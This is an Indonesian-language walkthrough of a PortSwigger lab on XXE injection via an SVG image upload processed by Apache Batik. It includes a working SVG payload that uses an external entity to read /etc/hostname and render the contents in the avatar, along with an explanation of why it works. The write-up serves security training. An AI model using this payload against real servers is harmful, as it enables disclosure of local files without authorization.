# Exploiting XXE via image file upload

Link: https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload

Ini merupakan lab dari website Portswigger dengan kategori XML external entity (XXE) injection. Lab ini bertujuan agar pengguna melampirkan avatar ke komentar dan menggunakan library Apache Batik untuk memproses berkas gambar avatar.

1. Langkah pertama adalah mengakses lab

![alt text](<img/Screenshot 2025-09-10 063320.png>)

2. View post untuk mengirimkan review beserta payload image svg

![alt text](<img/Screenshot 2025-09-10 063517.png>)

![alt text](<img/Screenshot 2025-09-10 064756.png>)

Isi payload dari kucing.svg yang saya gunakan adalah sebagai berikut 

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
```

Cara kerja dari payload adalah file SVG yang diunggah diperlakukan sebagai XML oleh Apache Batik. Saat parser membaca deklarasi `<!ENTITY xxe SYSTEM "file:///etc/hostname">`, maka akan membuat entity khusus yang merujuk ke file lokal server. Ketika elemen `<text>` memanggil `&xxe;`, parser otomatis menggantinya dengan isi file tersebut sehingga informasi sensitif muncul di hasil render.

3. Setelah berhasil memasukkan komentar beserta review, cek pada post tersebut

![alt text](<img/Screenshot 2025-09-10 064809.png>)

Terdapat gambar pada foto profile. Kemudian klik open image in new tab.

![alt text](<img/Screenshot 2025-09-10 064824.png>)

4. Terdapat data sensitif yang ditemukan pada foto profile. Ini sesuai dengan cara kerja payload svg tersebut.

![alt text](<img/Screenshot 2025-09-10 064911.png>)

5. Copy text dan lab berhasil diselesaikan

![alt text](<img/Screenshot 2025-09-10 064955.png>)

![alt text](<img/Screenshot 2025-09-10 065004.png>)